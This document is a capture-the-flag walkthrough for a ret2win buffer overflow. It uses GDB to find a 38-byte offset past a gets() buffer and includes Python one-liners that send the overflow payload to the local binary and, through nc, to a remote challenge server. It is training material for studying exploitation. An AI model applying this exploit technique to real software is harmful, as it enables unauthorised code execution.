# Stack Smashing Walkthrough

This walkthrough records the steps used to solve the challenge using GDB and a simple ret2win style overflow.

## Setup

- Make the binary executable:
  - `chmod +x ctf.exe`
- Start GDB:
  - `gdb ./ctf.exe`

## Disassemble and locate the overflow

- Disassemble `main` to spot the vulnerable input:
  - `disassemble main`
- Note the `gets` call and the buffer address setup:
  - `lea -0x22(%ebp), %eax`
  - This shows the buffer is at `$ebp - 0x22`.

## Find the offset to EIP

- Break after `gets`:
  - `b *0x08049858`
- Run and enter a pattern when prompted:
  - `run`
  - Input: `AAAABBBBCCCCDDDDEEEEFFFFGGGG`
- Dump bytes around the stack to see the pattern:
  - `x/64bx $ebp-0x40`
- Use the frame layout:
  - Saved `ebp` is at `$ebp`
  - Return address is at `$ebp+4`
  - Offset to return address:
    - $0x26$ bytes (38 decimal)

## Find the target function

- List functions and find `flag`:
  - `info functions flag`
- Found:
  - `0x08049865  flag`

## Build the payload

- Padding to EIP (38 bytes) + target address (little-endian):
  - `A * 38 + \x65\x98\x04\x08`

## Local test (optional)

```
python3 - <<'PY' | ./ctf.exe
import sys
sys.stdout.buffer.write(b"A"*38 + b"\x65\x98\x04\x08")
PY
```

## Remote exploit

```
python3 - <<'PY' | nc moa6.eecs.utk.edu 3002
import sys
sys.stdout.buffer.write(b"A"*38 + b"\x65\x98\x04\x08" + b"\n")
PY
```

- The remote service prints the flag after the payload runs.
